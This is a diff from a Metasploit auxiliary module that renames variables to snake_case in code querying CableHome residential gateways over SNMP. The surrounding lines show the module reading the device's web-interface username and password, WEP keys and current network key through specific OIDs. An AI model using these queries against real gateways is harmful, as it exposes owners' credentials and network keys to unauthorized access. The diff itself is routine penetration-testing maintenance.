@@ -63,19 +63,19 @@ class Metasploit3 < Msf::Auxiliary
         # using the CableHome cabhPsDevMib MIB module which defines the
         # basic management objects for the Portal Services (PS) logical element
         # of a CableHome compliant Residential Gateway device
-        deviceUiSelection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0').to_i
-        if deviceUiSelection == 1
+        device_ui_selection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0').to_i
+        if device_ui_selection == 1
           # manufacturerLocal(1) - indicates Portal Services is using the vendor
           # web user interface shipped with the device
-          deviceUiUsername = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
-          output_data["Username"] = deviceUiUsername.strip
+          device_ui_username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
+          output_data["Username"] = device_ui_username.strip
 
-          deviceUiPassword = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
-          output_data["Password"] = deviceUiPassword.strip
+          device_ui_password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
+          output_data["Password"] = device_ui_password.strip
         end
 
-        primaryWifiState = snmp.get_value('1.3.6.1.2.1.2.2.1.8.32').to_i
-        if primaryWifiState != 1
+        primary_wifi_state = snmp.get_value('1.3.6.1.2.1.2.2.1.8.32').to_i
+        if primary_wifi_state != 1
           # primary Wifi interface is not up
           print_status("Primary WiFi is disabled on the device")
         end
@@ -120,8 +120,8 @@ class Metasploit3 < Msf::Auxiliary
           output_data["WEP Key 4"] = wep_key4.unpack('H*')[0]
 
           # get current network key
-          currentKey = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_s
-          output_data["Current Network Key"] = currentKey
+          current_key = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_s
+          output_data["Current Network Key"] = current_key
 
           if network_auth_mode == 6
             get_radius_info(snmp, output_data)
